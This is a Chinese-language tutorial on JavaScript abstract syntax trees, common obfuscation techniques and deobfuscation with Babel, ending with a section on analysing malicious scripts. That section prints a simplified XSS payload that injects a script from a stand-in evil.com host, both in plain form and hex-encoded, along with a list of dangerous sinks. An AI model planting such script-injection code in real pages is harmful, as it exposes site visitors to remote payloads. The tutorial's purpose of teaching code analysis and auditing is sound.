# 1.AST介绍
AST（Abstract Syntax Tree，抽象语法树）是源代码的树形结构表示。JS 引擎执行代码前，会先把文本解析成 AST，再编译成字节码执行。
## 1.1 一段代码变成 AST 的过程
```js
// 原始代码
const a = 1 + 2;
```

```
VariableDeclaration（变量声明）
├── declarations
│   └── VariableDeclarator
│       ├── id: Identifier（标识符）
│       │   └── name: "a"
│       └── init: BinaryExpression（二元表达式）
│           ├── operator: "+"
│           ├── left: NumericLiteral（数字字面量）
│           │   └── value: 1
│           └── right: NumericLiteral
│               └── value: 2
└── kind: "const"
```
JS 引擎看到 const a = 1 + 2 ; 时，先把它解析成上面的树形结构，再根据树执行。每个节点（node）有 type（类型）和对应的属性。
## 1.2AST 对逆向很重要

| 视角       | 看代码的方式      | 适合做什么            |
| -------- | ----------- | ---------------- |
| 人眼读      | 读文本         | 理解简单逻辑           |
| 正则替换     | 按字符串模式匹配    | 简单批量替换（容易误伤）     |
| ⭐ AST 操作 | 遍历树节点，按类型筛选 | 	精确分析、批量改写、自动解混淆 |
> [!important]  核心认知
> 混淆代码对人眼是乱码，但对 AST 解析器来说是**结构化的树**。用 AST 操作可以精确地「找到所有某种节点 → 批量替换」，这是自动解混淆的基础。

# 2.用 AST Explorer 观察代码结构
[AST Explorer](https://astexplorer.net/) 是最常用的在线 AST 可视化工具。打开它，选择 JavaScript + @babel/parser，左边贴代码，右边实时显示 AST。

## 2.1 代码
```js
// 把这段贴到 AST Explorer 里观察
function checkLogin(password) {
  if (password === 'admin123') {
    return true;
  }
  return false;
}
```

## 2.2 AST 结构
```
FunctionDeclaration（函数声明）
├── id: Identifier { name: "checkLogin" }
├── params: [Identifier { name: "password" }]
└── body: BlockStatement（函数体）
    └── body: [
        IfStatement（if 语句）
        ├── test: BinaryExpression
        │   ├── operator: "==="
        │   ├── left: Identifier { name: "password" }
        │   └── right: StringLiteral { value: "admin123" }
        ├── consequent: BlockStatement
        │   └── ReturnStatement
        │       └── argument: BooleanLiteral { value: true }
        └── alternate: null

        ReturnStatement
        └── argument: BooleanLiteral { value: false }
      ]
```

> [!important]  关键节点类型（记住这几个）：
>-  Identifier — 变量名/函数名（如 password、checkLogin）
>- StringLiteral — 字符串字面量（如 'admin123'）
>- NumericLiteral — 数字字面量
>- BinaryExpression — 二元运算（如 a === b）
>- CallExpression — 函数调用（如 fn()）
>- MemberExpression — 属性访问（如 obj.prop）

# 3.常见混淆手段
混淆（Obfuscation）的目的是让代码**能运行但难读**。攻击者和保护代码的开发者用各种手段把代码搞乱。以下是四种最常见的混淆方式。
## 3.1 变量名混淆（最基础）
```js
// 原始代码
function checkLogin(password) {
  if (password === 'admin123') return true;
  return false;
}

// ⭐ 混淆后：变量名变成无意义的字符
function _0x4a2b(_0x3f1c) {
  if (_0x3f1c === 'admin123') return true;
  return false;
}
```
解混淆思路：AST 遍历所有 Identifier，批量改名
## 3.2 字符串数组 + 动态取值
```js
// 原始代码
const username = 'admin';
const password = 'secret123';

// ⭐ 混淆后：字符串藏到数组里，用索引取
var _0x1234 = ['admin', 'secret123'];
var _0x5678 = _0x1234[0];  // → 'admin'
var _0x9abc = _0x1234[1];  // → 'secret123'

// 更狠的：索引也加密
var _0x1234 = ['admin', 'secret123'];
var _0x5678 = _0x1234[0x0];  // 0x0 = 0
var _0x9abc = _0x1234[0x1];  // 0x1 = 1
```
解混淆思路：找到数组定义，把所有 arr\[index] 替换成实际字符串
## 3.3 字符串编码（十六进制/Unicode）
```js
// 原始代码
console.log('Hello World');

// ⭐ 混淆后：字符串变成十六进制编码
console.log('\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64');
// \x48 = 'H', \x65 = 'e', \x6c = 'l' ...

// 或者 Unicode 编码
console.log('\u0048\u0065\u006c\u006c\u006f\u0020\u0057\u006f\u0072\u006c\u0064');
```
解混淆思路：AST 找到 StringLiteral，解码后替换
# 3.4 控制流平坦化
```js
// 原始代码：顺序执行
function process(a) {
  let result = a;
  result = result + 1;
  result = result * 2;
  return result;
}

// ⭐ 混淆后：用 switch-case 打乱顺序
function process(a) {
  let result = a;
  let _0x1 = '2|0|1';  // 执行顺序：先 2，再 0，再 1
  let _0x2 = _0x1.split('|');
  let _0x3 = 0;

  while (true) {
    switch (_0x2[_0x3++]) {
      case '0': result = result + 1; continue;
      case '1': return result;
      case '2': result = result * 2; continue;
    }
  }
  // 实际执行：case '2' → result*2 → case '0' → result+1 → case '1' → return
}
```
解混淆思路：解析 switch-case 顺序，还原成顺序代码（最难）

# 4.解混淆实战：字符串解码
```js
// ⭐ 混淆代码：字符串用十六进制编码
var _msg = '\x48\x65\x6c\x6c\x6f';           // 'Hello'
var _target = '\x61\x64\x6d\x69\x6e';        // 'admin'
var _action = '\x6c\x6f\x67\x69\x6e';        // 'login'

console.log(_msg, _target, _action);

// ⭐ 简单解混淆：用 eval 让 JS 引擎解码
// （真实场景用 AST 遍历 StringLiteral 节点，这里简化演示）
function decodeString(s) {
  // 检测十六进制编码 \xHH
  if (s.indexOf('\\x') !== -1) {
    return eval('"' + s + '"');
  }
  return s;
}

console.log('--- 解码后 ---');
console.log('msg:', decodeString(_msg));
console.log('target:', decodeString(_target));
console.log('action:', decodeString(_action));
```

# 5.用 Babel 进行 AST 解混淆
真实解混淆用 [Babel](https://babeljs.io/)——JS 最流行的 AST 操作库。核心 API：
```js
// ⭐ Babel 解混淆的基本流程（Node 脚本写法）
// 安装：npm i @babel/parser @babel/traverse @babel/generator @babel/types
const parser = require('@babel/parser');
const traverse = require('@babel/traverse').default;   // ⭐ .default 别漏（ESM/CJS 互操作）
const generate = require('@babel/generator').default;
const t = require('@babel/types');

// 待解混淆的代码（真实混淆常用 String.fromCharCode 构造字符串）
const obfuscatedCode = `
var _0x4a2b = String.fromCharCode(72, 101, 108, 108, 111);   // 'Hello'
var _0x3f1c = String.fromCharCode(97, 100, 109, 105, 110);   // 'admin'
console.log(_0x4a2b, _0x3f1c);
`;

// ⭐ 第 1 步：解析代码成 AST
const ast = parser.parse(obfuscatedCode);

// ⭐ 第 2 步：遍历 AST，按「访问者模式」修改节点
traverse(ast, {
  // 识别 String.fromCharCode(72,101,...) 调用，替换成字符串字面量
  CallExpression(path) {
    const { callee, arguments: args } = path.node;
    if (
      t.isMemberExpression(callee) &&
      t.isIdentifier(callee.object, { name: 'String' }) &&
      t.isIdentifier(callee.property, { name: 'fromCharCode' }) &&
      args.length > 0 &&
      args.every(arg => t.isNumericLiteral(arg))
    ) {
      // 把数字参数转成字符拼成字符串
      const str = args.map(arg => String.fromCharCode(arg.value)).join('');
      // ⭐ 节点类型变了（CallExpression → StringLiteral），必须用 replaceWith 整个替换
      path.replaceWith(t.stringLiteral(str));
    }
  },

  // ⭐ 找到 _0x 开头的标识符，重命名成可读名字
  Identifier(path) {
    if (path.node.name.startsWith('_0x')) {
      path.node.name = 'var_' + path.node.name.slice(3);
    }
  }
});

// ⭐ 第 3 步：把 AST 重新生成代码
const output = generate(ast, {}, obfuscatedCode);
console.log(output.code);
// 输出：
// var var_4a2b = "Hello";
// var var_3f1c = "admin";
// console.log(var_4a2b, var_3f1c);
```

> [!important]  Babel 三板斧：
>1. parser.parse() — 代码 → AST
>2. traverse() — 遍历 AST，修改节点
>3. generate() — AST → 代码
>这三步覆盖了所有 AST 操作的核心：解析、遍历修改、重新生成。
# 6.安全方向：分析恶意脚本
## 6.1 典型恶意脚本模式
```js
// ⭐ 真实恶意脚本的简化版（XSS 载荷）
var _0x1 = ['script', 'src', 'https://evil.com/payload.js'];
var _0x2 = document['createElement'](_0x1[0]);
_0x2[_0x1[1]] = _0x1[2];
document['body']['appendChild'](_0x2);

// ⭐ 解混淆后：
var script = document.createElement('script');
script.src = 'https://evil.com/payload.js';
document.body.appendChild(script);
// 原来是注入外部恶意脚本！
```
## 6.2 分析流程

| 步骤      | 动作                                         | 工具                           |
| ------- | ------------------------------------------ | ---------------------------- |
| ① 格式化   | 把压缩的代码展开成多行                                | JS Beautifier / Prettier     |
| ② 解字符串  | 还原十六进制/Unicode/数组编码                        | AST 遍历 StringLiteral         |
| ③ 重命名变量 | 把 \_0x1234 改成有意义的名字                        | AST 遍历 Identifier            |
| ④ 还原控制流 | 把 switch-case 平坦化还原成顺序                     | 手动分析 + AST 改写                |
| ⑤ 识别行为  | 找 sink：eval、innerHTML、document.write、fetch | grep / AST 搜索 CallExpression |
> [!important]  审计重点 — 危险 sink：
>- eval() — 执行任意代码
>- innerHTML / document.write() — XSS 注入
>- new Function() — 动态执行（第 4 课学过）
>- document.createElement('script') — 注入外部脚本
>- fetch() / XMLHttpRequest — 外发数据
>- window.location — 跳转到钓鱼页面

```js
// ⭐ 下面是一段混淆的「恶意脚本」
// 试试手动解混淆：替换变量名、还原字符串

var _0xa1 = ['\x73\x63\x72\x69\x70\x74', '\x73\x72\x63', '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d\x2f\x70\x2e\x6a\x73'];

// 提示：
// \x73\x63\x72\x69\x70\x74 = 'script'
// \x73\x72\x63 = 'src'
// \x68\x74\x74\x70... = 'https://evil.com/p.js'

var _0xa2 = document[_0xa1[0]] ? null : document['createElement'](_0xa1[0]);
// 这行有逻辑陷阱
//恶意代码逻辑：页面有脚本 → 直接返回 null，不创建；页面完全没脚本，才创建脚本
//作用：隐藏恶意行为，避开普通网页环境下的安全检测，只在分析工具里暴露攻击代码

console.log('数组内容:');
for (var i = 0; i < _0xa1.length; i++) {
  console.log(i + ':', _0xa1[i]);
}
```

## 8.核心要点

| 概念         | 一句话                                              |
| ---------- | ------------------------------------------------ |
| AST        | 代码的树形结构表示，机器友好的格式                                |
| Babel 三板斧  | parse（解析）→ traverse（遍历修改）→ generate（生成）          |
| 变量名混淆      | _0x1234 替换有意义的名字 → AST 遍历 Identifier 重命名         |
| 字符串数组      | 字符串藏数组里用索引取 → 找到定义，替换所有引用                        |
| 字符串编码      | 十六进制/Unicode 编码 → AST 遍历 StringLiteral 解码        |
| 控制流平坦化     | switch-case 打乱顺序 → 最难解，需手动分析                     |
| 🔒 危险 sink | eval、innerHTML、document.write、new Function、fetch |
